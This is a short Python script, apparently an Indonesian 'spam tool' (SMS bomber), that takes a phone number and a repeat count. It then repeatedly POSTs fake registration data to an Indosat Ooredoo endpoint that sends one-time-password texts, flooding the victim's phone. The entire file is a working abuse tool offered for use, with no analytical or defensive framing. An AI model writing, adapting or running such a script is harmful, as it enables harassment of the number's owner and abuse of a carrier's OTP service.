#Spam Tools Indosat OOreedOO
#From Yutixcode import nadaku
#run 'v
#coded aldyansyahcp recoded
import time, json, os
import requests as req
from bs4 import BeautifulSoup as bs

赤い = '\033[91m'
黒い= '\033[92m'
気 = '\033[93m'
紫 = '\033[95m'
葵 = '\033[96m'
白い = '\033[37m'
off = '\033[m'

def send(n,o):
	url = "https://nadaku.indosatooredoo.com/doLogin?action=RegisterAndSendOTP&request_locale=ar"
	dat = { "loginMsisdn":n,"password":"Khadal123","confirmPassword":"Khadal123","name":"ardi","email":"andiajiek@gmail.com","catId":"567","isRobot":"1" }
	raw = req.post(url,data=dat).text
	res = json.loads(raw)["hasError"]
	if res == False:
		print(f"  {白い}[{黒い}Terkirim{白い}]Berhasil {気}{o}")
	else:
		print(f"  {白い}[{赤い}Gagal{白い}]Kirim {気}{o}")

def main():
    try:
	    os.system('clear')
	    print(f'{葵}[!] TOOLS SPAM INDOSAT COK [!] \n '.center(55)+'https://github.com/kroemen\n'+'ex 085'.center(30))
	    nomor = input(f'  {白い}Nomor: {葵}')
	    max = input(f'  {白い}Jumlah: {葵}')
	    print()
	    for i in range(int(max)):
		    time.sleep(1)
		    send(nomor,i+1)
	    print(f"\n  {白い}Selesai.")
    except ValueError:
            print('Wrong Input')
            lagi = input(f'{白い}Repeat Again? {紫}y/n: ')
            if lagi == "y" or lagi == "Y":
                main()
            else:
                exit()
    except KeyboardInterrupt:
            print(f"{赤い}\nCTRL+C EXITED!")

if __name__=="__main__":
	main()
